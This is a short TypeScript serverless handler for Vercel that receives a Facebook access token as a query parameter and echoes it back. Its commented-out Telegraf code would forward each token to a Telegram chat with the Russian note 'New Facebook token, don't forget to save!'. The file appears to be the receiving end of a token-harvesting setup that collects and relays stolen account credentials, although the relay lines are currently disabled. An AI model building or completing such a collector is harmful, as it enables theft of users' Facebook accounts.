//import { Telegraf } from 'telegraf';
import { VercelRequest, VercelResponse } from '@vercel/node';

//const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
//const CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';

//const bot = new Telegraf(BOT_TOKEN);

export default async (req: VercelRequest, res: VercelResponse) => {
  if (req.method !== 'GET') {
    return res.status(405).send('Method Not Allowed');
  }

  const { access_token } = req.query;

  if (!access_token) {
    return res.status(400).send('Missing access_token');
  }

  try {
    // Отправляем токен в Telegram
    //await bot.telegram.sendMessage(
    //  CHAT_ID,
    //  `🔑 Новый Facebook токен:\n\n\`${access_token}\`\n\nНе забудьте сохранить!`,
    //  { parse_mode: 'Markdown' }
    //);
    res.status(200).send('Token: ' + access_token);
    //res.status(200).send('Token received and sent to Telegram!');
  } catch (error) {
    console.error('Error:', error);
    res.status(500).send('Error sending token to Telegram');
  }
};
